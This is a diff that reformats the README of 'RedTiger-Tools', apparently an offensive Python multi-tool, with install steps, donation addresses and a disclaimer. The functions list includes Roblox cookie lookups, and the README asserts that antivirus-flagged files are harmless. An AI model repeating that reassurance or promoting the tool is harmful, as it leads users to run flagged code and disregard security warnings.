@@ -1,22 +1,43 @@
-# RedTiger-Tools
-📜・Description:
-All scripts in the "Settings/Program/FileDetectedByAntivirus" folder are detected by the antivirus but pose no threat to you. These are not backdoors or malware.
+<img align="center" src="Img/RedTiger-Banner.png" width="100%"> 
 
-👨‍💻 -> Developed in Python.
-🌍 -> Tool in English.
-💻 -> Available on Windows and Linux.
-🔎 -> No malware or backdoor.
-📂 -> Open Source only for verification, ensuring no malicious programs.
-🔄 -> Frequently updated.
-💰 -> Free for everyone.
+<p align="center">
+  <img src="https://img.shields.io/github/v/release/fluzyteck/RedTiger-Tools?label=Version&color=a80505">
+  <img src="https://img.shields.io/github/stars/fluzyteck/RedTiger-tools?style=flat&label=Stars&color=a80505">
+  <img src="https://img.shields.io/github/repo-size/fluzyteck/RedTiger-Tools?label=Size&color=a80505">
+  <img src="https://img.shields.io/github/languages/top/fluzyteck/RedTiger-Tools?color=a80505">
+</p>
 
-⭐・Features:
-   
-![img](https://github.com/loxy0dev/RedTiger-Tools/raw/main/Img/RedTiger.png)
-![img](https://github.com/loxy0dev/RedTiger-Tools/raw/main/Img/RedTiger-2.png)
-![img](https://github.com/loxy0dev/RedTiger-Tools/raw/main/Img/RedTiger-3.png)
+<p>
+  <h3 align="center">⭐ Don't forget to set the repository to "Star" ⭐</h3>
+  <h3 align="center">Join New Telegram: <a href="https://t.me/redtigersupport">t.me/redtigersupport</a></h3>
+</p>
+
+<h1>📜・Description:</h1>
+
+<p>
+    All scripts in the "<a href="https://github.com/loxyteck/RedTiger-Tools/tree/main/Settings/Program/FileDetectedByAntivirus">Settings/Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
+
+  👨‍💻 -> Developed in <strong>Python</strong>.<br>
+  🌍 -> Tool in <strong>English</strong>.<br>
+  💻 -> Available on <strong>Windows</strong> and <strong>Linux</strong>.<br>
+  🔎 -> <strong>No malware</strong> or <strong>backdoor</strong>.<br>
+  📂 -> <strong>Open Source</strong> only for verification, ensuring no malicious programs.<br>
+  🔄 -> <strong>Frequently updated</strong>.<br>
+  💰 -> <strong>Free</strong> for everyone.<br>
+</p>
+
+<h1>⭐・Features: </h1>
+
+<p align="center">
+  <img src="Img/RedTiger.png" width="49%"> 
+  <img src="Img/RedTiger-2.png" width="49%"> 
+  <img src="Img/RedTiger-3.png" width="49%"> 
+  <img src="Img/Builder.png" width="49%">
+</p>
+
+<h1>⚙️・Functions:</h1>
+
 ```
-⚙️・Functions:
 ┌── ⚒️ - RedTiger-Tools
 │   ├── Info
 │   └── Site
@@ -109,31 +130,73 @@ All scripts in the "Settings/Program/FileDetectedByAntivirus" folder are detecte
     ├── Roblox Cookie Info
     ├── Roblox User Info
     └── Roblox Id Info
+
+
+
 ```
 
+<h1>🔒・Requirements:</h1>
 
-🔒・Requirements:
-Windows:
-- Install Python with the PATH options.
+<h3>Windows:</h3>
+
+<p>
+- Install <a href="https://www.python.org/downloads/">Python</a> with the <a href="Img/Python_Path.png">PATH</a> options.<br>
 - Windows 10 & 11 or +
+</p>
 
-Linux:
-- Latest version of Python.
+<h3>Linux:</h3>
+
+<p>
+- Latest version of <a href="https://www.python.org/downloads/">Python</a>.<br>
 - Linux recent version.
+</p>
 
-⏳・Installation:
-Dowloads "RedTiger-Tools.zip" Here
+<h1>⏳・Installation:</h1>
 
+<a href="https://github.com/loxyteck/RedTiger-Tools/archive/refs/tags/v6.0.zip">Dowloads "RedTiger-Tools.zip" Here</a>
 
+<p>
+  
+```
 1 - Download the .zip folder.
 2 - Extract or unzip the folder.
 3 - Launch "Setup.bat" or "Setup.py".
+```
 Or
-
+```
 1 - Open a terminal.
 2 - Write "git clone https://github.com/loxyteck/RedTiger-Tools.git"
 3 - Write "cd RedTiger-Tools"
 4 - Write "git pull"
 5 - Write "python Setup.py"
-⚠️・Terms of use:
-RedTiger has been developed solely for educational purposes. This project has been created with good intentions and is intended for personal use only. By choosing to use RedTiger, you acknowledge and accept full responsibility for any consequences that may result from your actions.
+```
+</p>
+
+<h1>⚠️・Terms of use:</h1>
+
+<p>
+  RedTiger has been developed solely for educational purposes. This project has been created with good intentions and is intended for personal use only. By choosing to use RedTiger, you acknowledge and accept full responsibility     for any consequences that may result from your actions.
+</p>
+
+<h1>💰・Donation:</h1>
+<p>
+  
+  <strong>Bitcoin Adress:</strong>
+  ``` 
+1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+  ```
+  <strong>Litecoin Adress:</strong>
+  ```
+LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+  ```
+
+</p>
+
+<h2>🔗・Credits:</h2>
+
+<p>
+  - <a href="https://t.me/redtigersupport">Telegram</a><br>
+  - <a href="https://redtiger.shop">Website</a><br>
+  - Creator: Loxy0dev<br>
+  - Version: 6.0
+</p>
